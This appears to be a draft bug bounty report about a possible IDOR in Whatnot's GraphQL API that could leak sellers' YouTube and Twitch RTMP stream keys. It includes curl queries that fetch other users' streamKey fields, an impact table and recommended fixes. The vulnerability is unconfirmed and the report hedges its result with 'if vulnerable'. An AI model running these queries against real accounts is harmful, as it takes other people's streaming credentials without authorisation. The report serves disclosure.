# HackerOne Submission — Third-Party RTMP Stream Keys Exposed via Multicast API

**Program:** Whatnot  
**Weakness:** Sensitive Data Exposure / IDOR  
**Severity:** High  
**Asset:** api.whatnot.com  

---

## Summary

Whatnot's multicasting feature allows sellers to simultaneously broadcast their live stream to YouTube Live and Twitch. To do this, Whatnot stores the seller's third-party RTMP stream keys (YouTube Stream Key, Twitch Stream Key). These keys are permanent credentials that give full control over the seller's YouTube/Twitch live stream. If the GraphQL API returns these RTMP keys for other users' streams via an IDOR vulnerability, an attacker can steal them and use them to:
- Go live on the victim's YouTube/Twitch channel from anywhere in the world
- Broadcast any content (malicious, NSFW, illegal) under the victim's identity
- Permanently disrupt the victim's streaming setup

---

## Background

Whatnot supports multicasting to YouTube and Twitch simultaneously. Sellers configure this by entering their third-party RTMP keys in Whatnot's settings. Whatnot must store and transmit these keys server-side to relay the stream.

---

## Steps to Reproduce

### Step 1 — Fetch your own multicast settings (establish baseline)

```bash
curl -s -X POST https://api.whatnot.com/seller-api/graphql \
  -H "Authorization: Bearer wn_access_tk_YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ me { multicastDestinations { platform rtmpUrl streamKey status } } }"
  }'
```

Expected response for your own account:
```json
{
  "data": {
    "me": {
      "multicastDestinations": [
        { "platform": "YOUTUBE", "rtmpUrl": "rtmp://a.rtmp.youtube.com/live2", "streamKey": "xxxx-xxxx-xxxx-xxxx" },
        { "platform": "TWITCH", "rtmpUrl": "rtmp://live.twitch.tv/app", "streamKey": "live_XXXXXXXX" }
      ]
    }
  }
}
```

---

### Step 2 — Attempt to fetch another seller's multicast keys via IDOR

```bash
# Replace USER_ID_B with another seller's user ID (find from their public profile)
curl -s -X POST https://api.whatnot.com/seller-api/graphql \
  -H "Authorization: Bearer wn_access_tk_YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "query": "query { user(id: \"SELLER_B_USER_ID\") { multicastDestinations { platform rtmpUrl streamKey status } } }"
  }'
```

---

### Step 3 — Test via live stream query (nested IDOR)

```bash
# The LIVE_QUERY already confirmed streamToken is present
# Try fetching RTMP keys through the live stream object
curl -s -X POST https://api.whatnot.com/seller-api/graphql \
  -H "Authorization: Bearer wn_access_tk_YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "query": "query { live(id: \"VICTIM_STREAM_ID\") { id streamToken multicastDestinations { platform rtmpUrl streamKey } user { multicastDestinations { platform rtmpUrl streamKey } } } }"
  }'
```

---

### Step 4 — Verify impact with a stolen YouTube key

If a `streamKey` is returned for another user's account:

```bash
# Verify the key is valid by attempting to push a test stream
# DO NOT actually do this in practice — confirming the key format is sufficient for PoC
# YouTube stream keys follow format: xxxx-xxxx-xxxx-xxxx-xxxx
# Twitch keys follow format: live_XXXXXXXXXXXXXXXXX

# In your report, simply confirm:
# 1. The streamKey field returned a non-null value for another user's account
# 2. The key matches the expected format for the platform
# 3. Screenshot the response as proof
```

---

## Expected Result

`multicastDestinations` including `streamKey` should only be accessible through the `me` resolver (the authenticated user's own data). Querying another user's multicast settings should return `null` or a permissions error.

## Actual Result (if vulnerable)

Another seller's RTMP stream key is returned, allowing complete takeover of their YouTube/Twitch live streaming.

---

## Impact

| Platform | Impact of Key Theft |
|---|---|
| YouTube | Broadcast any content live on victim's YouTube channel; trigger strikes/bans on victim's account |
| Twitch | Take over victim's Twitch stream; DMCA bait, ban-worthy content under victim's identity |
| Both | Victim's streaming career/income permanently disrupted; impossible to recover if key is used maliciously |

For high-profile sellers with large followings, this is effectively an account takeover of their content platform identity — potentially more damaging than their Whatnot account itself.

---

## Recommended Fix

- `multicastDestinations` and `streamKey` must **only** resolve through the `me` resolver, never through `user(id: X)` queries
- Encrypt RTMP keys at rest — store encrypted with a per-user key so even database access doesn't expose plaintext keys
- Rotate stream keys immediately when a seller disconnects a destination from Whatnot
- Add audit logging for every access to RTMP key fields
